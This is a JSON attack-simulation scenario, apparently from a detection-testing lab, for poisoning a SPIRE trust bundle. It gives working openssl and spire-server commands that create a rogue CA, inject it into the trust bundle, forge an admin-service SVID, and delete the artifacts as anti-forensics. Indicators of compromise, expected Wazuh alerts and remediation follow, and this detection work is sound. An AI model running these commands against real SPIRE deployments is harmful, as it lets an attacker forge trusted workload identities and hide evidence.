@@ -1,0 +1,193 @@
+{
+  "id": "S7-08",
+  "name": "Trust Bundle Poisoning",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Inject a rogue CA certificate into a SPIRE trust domain's trust bundle, enabling issuance of forged SVIDs that are accepted by all verifiers in the domain",
+  "difficulty": "Expert",
+  "real_world_relevance": "A compromised SPIRE Server admin API allows an attacker to inject a rogue CA into the trust bundle, effectively becoming a trusted identity issuer for the entire mesh. All workloads in the trust domain will accept SVIDs signed by the attacker's CA without any further exploitation.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Defense Evasion", "Persistence"],
+    "techniques": [
+      {"id": "T1556", "name": "Modify Authentication Process"},
+      {"id": "T1553.004", "name": "Subvert Trust Controls: Install Root Certificate"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker with SPIRE Server admin socket access injects a rogue CA certificate into the trust bundle, then uses that CA to sign forged SVIDs accepted by all mesh workloads",
+    "diagram": [
+      "1. Attacker gains access to SPIRE Server admin API socket",
+      "2. Generate rogue CA key pair and self-signed certificate",
+      "3. Use spire-server bundle set to inject rogue CA into trust bundle",
+      "4. Verify rogue CA is present in the trust bundle via bundle show",
+      "5. Generate SVIDs signed by rogue CA",
+      "6. Verifying workloads accept the forged SVIDs because the rogue CA is in the trust bundle",
+      "7. Complete identity infrastructure compromise achieved"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Rogue CA Generation",
+      "description": "Generate a rogue Certificate Authority key pair and self-signed certificate",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "openssl genrsa -out /tmp/rogue-ca.key 2048",
+          "description": "Generate 2048-bit RSA private key for rogue CA"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "openssl req -new -x509 -key /tmp/rogue-ca.key -out /tmp/rogue-ca.crt -days 365 -subj \"/CN=rogue-ca\" -addext \"basicConstraints=critical,CA:TRUE\" -addext \"keyUsage=critical,keyCertSign,cRLSign\"",
+          "description": "Create self-signed CA certificate with proper CA extensions"
+        }
+      ]
+    },
+    {
+      "name": "Trust Bundle Injection",
+      "description": "Inject the rogue CA certificate into the SPIRE trust domain bundle",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server bundle set -id spiffe://example.org -path /tmp/rogue-ca.crt -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Inject rogue CA into the trust bundle for spiffe://example.org trust domain"
+        }
+      ]
+    },
+    {
+      "name": "Injection Verification",
+      "description": "Verify that the rogue CA has been added to the trust bundle",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server bundle show -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Show trust bundle contents to confirm rogue CA presence"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server bundle show -socketPath /tmp/spire-server/private/api.sock | openssl x509 -noout -subject -issuer 2>/dev/null | grep rogue",
+          "description": "Parse bundle output to confirm rogue-ca CN is present in trust chain"
+        }
+      ]
+    },
+    {
+      "name": "Forged SVID Generation",
+      "description": "Generate a forged X.509 SVID signed by the rogue CA",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "openssl genrsa -out /tmp/forged-svid.key 2048",
+          "description": "Generate key pair for forged workload SVID"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "openssl req -new -key /tmp/forged-svid.key -out /tmp/forged-svid.csr -subj \"/CN=forged-workload\" -addext \"subjectAltName=URI:spiffe://example.org/admin-service\"",
+          "description": "Create CSR with SPIFFE ID URI SAN for admin-service identity"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "openssl x509 -req -in /tmp/forged-svid.csr -CA /tmp/rogue-ca.crt -CAkey /tmp/rogue-ca.key -CAcreateserial -out /tmp/forged-svid.crt -days 1 -copy_extensions copyall",
+          "description": "Sign forged SVID with rogue CA - this certificate will be trusted by all workloads"
+        }
+      ]
+    },
+    {
+      "name": "Cleanup Artifacts",
+      "description": "Remove forensic evidence of the rogue CA and forged certificates",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "rm -f /tmp/rogue-ca.key /tmp/rogue-ca.crt /tmp/rogue-ca.srl /tmp/forged-svid.key /tmp/forged-svid.csr /tmp/forged-svid.crt",
+          "description": "Delete rogue CA and forged SVID artifacts from disk"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "SPIRE Server API",
+      "description": "SetFederatedBundle or AppendBundle API call detected in SPIRE server audit log",
+      "wazuh_rule": "101041"
+    },
+    {
+      "type": "File Integrity Monitoring",
+      "description": "SPIRE trust bundle file or configuration modified on disk",
+      "wazuh_rule": "101042"
+    },
+    {
+      "type": "Process Execution",
+      "description": "openssl commands generating CA certificates and signing SVIDs inside SPIRE container",
+      "wazuh_rule": "101042"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101041",
+      "level": 14,
+      "description": "NHI-SPIRE: Trust bundle modified - potential trust boundary attack"
+    },
+    {
+      "rule_id": "101042",
+      "level": 12,
+      "description": "NHI-SPIRE: Configuration file modified"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Remove the rogue CA certificate from the trust bundle using spire-server bundle set with a clean bundle",
+      "Rotate the SPIRE Server upstream CA and all issued SVIDs",
+      "Revoke all SVIDs issued during the compromise window",
+      "Audit SPIRE Server API access logs for unauthorized SetFederatedBundle/AppendBundle calls"
+    ],
+    "long_term": [
+      "Restrict SPIRE Server admin socket access using Unix permissions and network policies",
+      "Enable mTLS authentication for SPIRE Server admin API access",
+      "Implement trust bundle change alerting with automatic rollback capability",
+      "Use SPIRE bundle endpoint with HTTPS and signature verification for federated trust",
+      "Deploy File Integrity Monitoring on SPIRE Server data directories and bundle files",
+      "Implement separation of duties: different credentials for entry management vs bundle management"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SPIFFE Trust Bundle Specification",
+      "url": "https://github.com/spiffe/spiffe/blob/main/standards/SPIFFE_Trust_Domain_and_Bundle.md"
+    },
+    {
+      "title": "SPIRE Server Bundle API Documentation",
+      "url": "https://spiffe.io/docs/latest/deploying/spire_server/"
+    },
+    {
+      "title": "MITRE ATT&CK T1553.004 - Install Root Certificate",
+      "url": "https://attack.mitre.org/techniques/T1553/004/"
+    },
+    {
+      "title": "The Machine with Many Faces - Eviatar Gerzi (CyberArk)",
+      "url": "https://nullcon.net/"
+    }
+  ]
+}
